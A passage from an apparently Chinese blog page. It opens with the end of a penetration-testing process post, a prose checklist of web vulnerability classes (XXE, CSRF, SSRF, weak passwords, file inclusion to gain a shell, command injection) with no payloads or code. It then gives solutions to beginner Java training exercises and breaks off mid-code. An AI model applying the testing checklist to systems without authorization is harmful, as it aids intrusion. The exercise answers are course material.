<p>xxe漏洞不知道大家有没有过多的去关注，这类漏洞如果存在的话危害是非常大的，从读取信息到探测内网等等，很值得我们去关注</p>
<p>逻辑漏洞</p>
<p>逻辑漏洞包括任意重置用户密码，修改订单等等，这类漏洞是扫描器所不能扫描出来的，所以需要我们认真分析整个站点的功能，分析其逻辑，多用burpsuite抓包观察数据包是否可篡改，验证码是否可爆破等等</p>
<p>csrf</p>
<p>检测csrf漏洞一般是看每一个操作是否有验证码验证，是否有token或者referer,可以注册多个账户然后利用A用户生成的poc去检测B用户</p>
<p>ssrf</p>
<p>在介绍信息收集的时候说过需要常常打开F12，以便于我们发现这种漏洞</p>
<p>未授权访问</p>
<p>这里所指的未授权包括各种空密码之类的，这种漏洞危害是不言而喻的</p>
<p>弱口令，越权访问</p>
<p>可以通过爆破的方式发现弱口令，而越权访问又包括水平越权和垂直访问，这种漏洞我们可以观察url是否带有用户的明文信息或者直接访问一些敏感页面</p>
<p>各种框架漏洞</p>
<p>比如说structs这个框架的漏洞层出不穷，当明确了目标所使用何种框架之后，我们可以使用poc进行验证</p>
<p>信息泄露</p>
<p>信息泄露即通过各种搜索手段或者查看robots.txt之类的铭感目录得到铭感信息</p>
<p>文件包含</p>
<p>当我们在遇到文件上传并且有白名单校验的时候，利用文件包含可以轻松getshell</p>
<p>命令注入</p>
<p>命令注入的思路与sql注入思路是差不多的，都是对用户的输入过滤不严谨，关于这种漏洞笔者找到了几条相似案例：<br>搜狐某战点存在隐式命令注入<br>案例2</p>
<p>最后需要注意的是在进行漏洞发现的时候应该对每一个事件利用burpsuite进行抓包仔细观察数据包的传送情况，不放过任何一个可利用的点。</p>
<h1 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h1><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1>
      
    </div>
    <footer class="article-footer">
      <a data-url="https://style-404.github.io/2019/03/25/渗透测试流程/" data-id="cjvrp4gkx00205gqrsqwe6o3d" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-JAVA实训题" class="article article-type-post" itemscope="" itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/03/25/JAVA实训题/" class="article-date">
  <time datetime="2019-03-25T04:54:05.000Z" itemprop="datePublished">2019-03-25</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/03/25/JAVA实训题/">JAVA实训题</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="第1关：随机数"><a href="#第1关：随机数" class="headerlink" title="第1关：随机数"></a>第1关：随机数</h2><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> step1;</span><br><span class="line"><span class="keyword">public</span> class MaxMin&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> main(<span class="keyword">String</span>[] args)&#123;</span><br><span class="line">    	<span class="keyword">double</span>[] arr = <span class="keyword">new</span> <span class="keyword">double</span>[<span class="number">100</span>];</span><br><span class="line">        <span class="built_in">int</span> s=<span class="number">0</span>;				<span class="comment">//定义 统计大于50的整数个数 变量</span></span><br><span class="line">        <span class="keyword">double</span> <span class="built_in">max</span>=<span class="number">0</span>,<span class="built_in">min</span>=<span class="number">100</span>;	<span class="comment">//定义 最大值 最小值 变量</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="built_in">int</span> i=<span class="number">0</span>;i&lt;<span class="number">100</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">double</span> d=<span class="number">100</span>*Math.<span class="built_in">random</span>();<span class="comment">//获取随机数</span></span><br><span class="line">	    arr[i] = d;</span><br><span class="line">        <span class="comment">/********* Begin *********/</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(arr[i]&gt;<span class="built_in">max</span>) &#123;</span><br><span class="line">        	<span class="built_in">max</span> = Math.<span class="built_in">floor</span>(arr[i]);</span><br><span class="line">        	&#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(arr[i]&lt;<span class="built_in">min</span>) &#123;</span><br><span class="line">        	<span class="built_in">min</span> = Math.<span class="built_in">floor</span>(arr[i]);</span><br><span class="line">        	&#125;</span><br><span class="line">        <span class="keyword">if</span>(arr[i]&gt;<span class="number">50</span>) &#123;</span><br><span class="line">        	s ++;</span><br><span class="line">        	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/********* end *********/</span></span><br><span class="line">        &#125;</span><br><span class="line">        judgeRadom.cpm(arr,<span class="built_in">max</span>,<span class="built_in">min</span>,s);	<span class="comment">//这个方法会判断你的计算是否正确</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编写程序，利用数组计算Fibonacci数列的前20个元素的值。</p>
<figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">package step2;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Fibonacci</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> main(String args[])&#123;</span><br><span class="line">	<span class="comment">/*********begin********/</span></span><br><span class="line">        <span class="keyword">int</span> arr[] = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">20</span>];</span><br><span class="line">        arr[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        arr[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> <span class="keyword">sum</span> = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>; i&lt;arr.length;i++)&#123;</span><br><span class="line">            arr[i] = arr[i<span class="number">-1</span>] + arr[i<span class="number">-2</span>];</span><br><span class="line">            <span class="keyword">sum</span> = <span class="keyword">sum</span> + arr[i];</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        System.out.printf(<span class="string">"前20个元素的和为"</span> + <span class="keyword">sum</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">/********end********/</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用递归计算1＋2＋…＋n之和。</p>
<figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">package step3;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">Sum</span></span>&#123;</span><br><span class="line">	public <span class="keyword">static</span> <span class="keyword">void</span> main(<span class="built_in">String</span> args[])&#123;</span><br><span class="line">		Scanner sc = <span class="keyword">new</span> Scanner(System.<span class="keyword">in</span>);</span><br><span class="line">		<span class="built_in">int</span> <span class="built_in">num</span> = sc.nextInt();</span><br><span class="line">        <span class="built_in">int</span> result = recursionSum(<span class="built_in">num</span>);</span><br><span class="line">        System.out.println(result);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">static</span> <span class="built_in">int</span> recursionSum(<span class="built_in">int</span> mum)&#123;</span><br><span class="line">        <span class="comment"><span class="markdown">/<span class="strong">*****</span><span class="strong">****begin**</span><span class="strong">*****</span>**/</span></span>       </span><br><span class="line">		<span class="keyword">if</span>(mum==<span class="number">1</span>) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">		&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> mum+recursionSum(mum<span class="number">-1</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment"><span class="markdown">/<span class="strong">*****</span><span class="strong">****end**</span><span class="strong">*****</span>**/</span></span></span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>类的定义 与 对象的创建<br>设计一个表示学生的类，该类具有表示姓名的属性name和表示年龄的属性age，同时还具有表示说话行为的方法speak()，用于输出学生的姓名和年龄。</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">package task01;</span><br><span class="line">import java.util.Scanner;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 说明：根据TODO提示信息，在横线处编写对应功能代码，</span></span><br><span class="line"><span class="comment"> *      编写代码时，注意要删除对应的横线。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">// TODO 在此定义学生类名</span></span><br><span class="line"><span class="keyword">class</span> <span class="title">Student</span>&#123;</span><br><span class="line">    <span class="comment">// TODO 在此定义2个成员变量</span></span><br><span class="line">    String name;</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">speak</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        System.<span class="keyword">out</span>.println(<span class="string">"我的姓名:"</span>+name+<span class="string">",年龄:"</span>+age);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Task01</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span>(<span class="params">String[] args</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        Scanner scan = <span class="keyword">new</span> Scanner(System.<span class="keyword">in</span>);</span><br><span class="line">        <span class="comment">// TODO 在此定义一个学生对象</span></span><br><span class="line">        Student stu = <span class="keyword">new</span> Student();</span><br><span class="line">        <span class="comment">// TODO 在此给学生对象姓名赋值</span></span><br><span class="line">        stu.name = scan.next();</span><br><span class="line">        <span class="comment">// TODO 在此给学生对象年龄赋值</span></span><br><span class="line">        stu.age = scan.nextInt();</span><br><span class="line">        <span class="comment">// TODO 在此调用学生对象 speak() 方法</span></span><br><span class="line">        stu.speak();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>本实训将创建三个学生对象，它们的引用变量分别是s1、s2和s3，首先分别使用s1和s2引用为name和age赋值，然后调用speak()方法，最后将s2变量赋值给s3，s3也调用speak()方法。</p>
<figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">package task02;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 说明：根据提示，补充完整 begin 和 end 之间的代码。</span></span><br><span class="line"><span class="comment"> *     （其他代码可以不用改）</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment"><span class="markdown">/<span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="bullet">* begin *</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span>*/</span></span></span><br><span class="line"><span class="comment">// 在此定义学生类名</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span></span><br><span class="line"><span class="class">/**************** <span class="title">end</span> *****************/</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="comment"><span class="markdown">/<span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="bullet">* begin *</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span>*/</span></span></span><br><span class="line">	<span class="comment">// 在此定义2个成员变量：姓名name和年龄age</span></span><br><span class="line">    <span class="built_in">String</span> name;</span><br><span class="line">	<span class="built_in">int</span> age;</span><br><span class="line">	<span class="comment"><span class="markdown">/<span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="bullet">* end *</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span>*/</span></span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">void</span> speak() &#123;</span><br><span class="line">		System.out.println(<span class="string">"我的名字是"</span> + name + <span class="string">",今年"</span> + age + <span class="string">"岁"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">Task02</span></span>&#123;</span><br><span class="line">	public <span class="keyword">static</span> <span class="keyword">void</span> main(<span class="built_in">String</span>[] args) &#123;</span><br><span class="line">		Scanner scan = <span class="keyword">new</span> Scanner(System.<span class="keyword">in</span>);</span><br><span class="line"></span><br><span class="line">		<span class="comment"><span class="markdown">/<span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="bullet">* begin *</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span>*/</span></span></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * 创建Student类的第一个对象，其引用变量为s1，</span></span><br><span class="line"><span class="comment">		 * 使用s1分别为name和age赋值，值为运行时接收从键盘输入</span></span><br><span class="line"><span class="comment">		 * 然后调用speak()方法。</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">        Student s1 = <span class="keyword">new</span> Student();</span><br><span class="line">		s1.name = scan.next();</span><br><span class="line">        s1.age = scan.nextInt();</span><br><span class="line">        s1.speak();</span><br><span class="line">		<span class="comment"><span class="markdown">/<span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="bullet">* end *</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span>*/</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		<span class="comment"><span class="markdown">/<span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="bullet">* begin *</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span>*/</span></span></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * 创建Student类的第二个对象，其引用变量为s2，</span></span><br><span class="line"><span class="comment">		 * 使用s2分别为name和age赋值，值为运行时接收从键盘输入，</span></span><br><span class="line"><span class="comment">		 * 然后调用speak()方法。</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		Student s2 = <span class="keyword">new</span> Student();</span><br><span class="line">        s2.name = scan.next();</span><br><span class="line">        s2.age = scan.nextInt();</span><br><span class="line">        s2.speak();</span><br><span class="line">		<span class="comment"><span class="markdown">/<span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="bullet">* end *</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span>*/</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		<span class="comment"><span class="markdown">/<span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="bullet">* begin *</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span>*/</span></span></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * 创建Student类的第三个对象，其引用变量为s3，</span></span><br><span class="line"><span class="comment">		 * 将s2的值赋给s3，</span></span><br><span class="line"><span class="comment">		 * 然后使用s3调用speak()方法。</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">        Student s3 = <span class="keyword">new</span> Student();</span><br><span class="line">        s3 = s2;</span><br><span class="line">        s3.speak();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		<span class="comment"><span class="markdown">/<span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="bullet">* end *</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span>*/</span></span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对类进行封装，防止外界对类中的成员变量随意访问。<br>为了掌握类的封装，本练习将使用private关键字对学生类的成员变量name和age进行私有化，同时分别提供一个setName(String n)和setAge(int a)方法用于外界的访问，其中setAge(int a)中需要对age进行判断。</p>
<figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">package task03;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 说明：根据提示，补充完整 begin 和 end 之间的代码。</span></span><br><span class="line"><span class="comment"> *     （其他代码可以不用改）</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment"><span class="markdown">/<span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="bullet">* begin *</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span>*/</span></span></span><br><span class="line"><span class="comment">// 在此定义学生类名</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span></span><br><span class="line"><span class="class">/**************** <span class="title">end</span> *****************/</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="comment"><span class="markdown">/<span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="bullet">* begin *</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span>*/</span></span></span><br><span class="line">	 <span class="comment">// 将名字name和年龄age属性定义为私有的</span></span><br><span class="line">	private <span class="built_in">String</span> name;</span><br><span class="line">    private <span class="built_in">int</span> age;</span><br><span class="line">	<span class="comment"><span class="markdown">/<span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="bullet">* end *</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span>*/</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment"><span class="markdown">/<span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="bullet">* begin *</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span>*/</span></span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * 定义4个公有的方法：getName()、setName(String n)、</span></span><br><span class="line"><span class="comment">	 * getAge()和setAge(int a)，</span></span><br><span class="line"><span class="comment">	 * 用于对外访问name和age。</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * 在setAge(int a)方法中对传入的参数进行检查，</span></span><br><span class="line"><span class="comment">	 * 如果输入值为负数，则打印出“设置的年龄不合法”，</span></span><br><span class="line"><span class="comment">	 * 如果不为负数，才将其设置为age属性的值。</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	public <span class="built_in">String</span> getName()&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="built_in">int</span> getAge()&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="keyword">void</span> setAge(<span class="built_in">int</span> age)&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(age&lt;<span class="number">0</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">"设置的年龄不合法"</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.age = age;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="keyword">void</span> setName(<span class="built_in">String</span> name)&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment"><span class="markdown">/<span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="bullet">* end *</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span>*/</span></span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">void</span> speak() &#123;</span><br><span class="line">		System.out.println(<span class="string">"我的名字是"</span> + name + <span class="string">",今年"</span> + age + <span class="string">"岁"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">Task03</span></span>&#123;</span><br><span class="line">	public <span class="keyword">static</span> <span class="keyword">void</span> main(<span class="built_in">String</span>[] args) &#123;</span><br><span class="line">		Scanner scan = <span class="keyword">new</span> Scanner(System.<span class="keyword">in</span>);</span><br><span class="line">		<span class="built_in">String</span> name1 = scan.next();</span><br><span class="line">		<span class="built_in">int</span> age1 = scan.nextInt();</span><br><span class="line"></span><br><span class="line">		<span class="comment"><span class="markdown">/<span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="bullet">* begin *</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span>*/</span></span></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * 创建Student类的实例对象，</span></span><br><span class="line"><span class="comment">		 * 通过调用对象的setName(String n)和setAge(int a)方法</span></span><br><span class="line"><span class="comment">		 * 来设置实例对象的name属性和age属性值，</span></span><br><span class="line"><span class="comment">		 * 方法的参数值为运行时接收从键盘输入，</span></span><br><span class="line"><span class="comment">		 * 并调用speak()方法。</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">        Student stu = <span class="keyword">new</span> Student();</span><br><span class="line">        stu.setName(name1);</span><br><span class="line">        stu.setAge(age1);</span><br><span class="line">        stu.speak();</span><br><span class="line"></span><br><span class="line">		<span class="comment"><span class="markdown">/<span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="bullet">* end *</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span>*/</span></span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="第二章"><a href="#第二章" class="headerlink" title="第二章"></a>第二章</h1><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> chapter2.step7;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;        <span class="comment">//1.导入Scanner</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> HelloWorld&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> main(String[] args) &#123;</span><br><span class="line">        Scanner input = <span class="keyword">new</span> Scanner(System.in);    <span class="comment">//2.声明扫描仪</span></span><br><span class="line">        System.out.<span class="keyword">println</span>(<span class="string">"请录入嫦娥个人信息："</span>);</span><br><span class="line">        System.out.<span class="keyword">println</span>(<span class="string">"请输入姓名："</span>);</span><br><span class="line">        String name = input.<span class="keyword">next</span>();</span><br><span class="line">        System.out.<span class="keyword">println</span>(<span class="string">"请输入年龄："</span>);</span><br><span class="line">        <span class="keyword">int</span> age = input.nextInt();</span><br><span class="line">        System.out.<span class="keyword">println</span>(<span class="string">"请输入性别："</span>);</span><br><span class="line">        String sex = input.<span class="keyword">next</span>();</span><br><span class="line">        System.out.<span class="keyword">println</span>(<span class="string">"请输入体重："</span>);</span><br><span class="line">        <span class="keyword">float</span> weight = input.nextFloat();</span><br><span class="line">        System.out.<span class="keyword">println</span>(<span class="string">"请输入地址："</span>);</span><br><span class="line">        String address = input.<span class="keyword">next</span>();</span><br><span class="line">        System.out.<span class="keyword">println</span>(<span class="string">"请输入是否已婚："</span>);</span><br><span class="line">        String isMarried = input.<span class="keyword">next</span>();</span><br><span class="line">        System.out.<span class="keyword">println</span>(<span class="string">"信息如下："</span>);</span><br><span class="line">        System.out.<span class="keyword">println</span>(<span class="string">"\t姓名："</span> + name);</span><br><span class="line">        System.out.<span class="keyword">println</span>(<span class="string">"\t年龄："</span> + age + <span class="string">"岁"</span>);</span><br><span class="line">        System.out.<span class="keyword">println</span>(<span 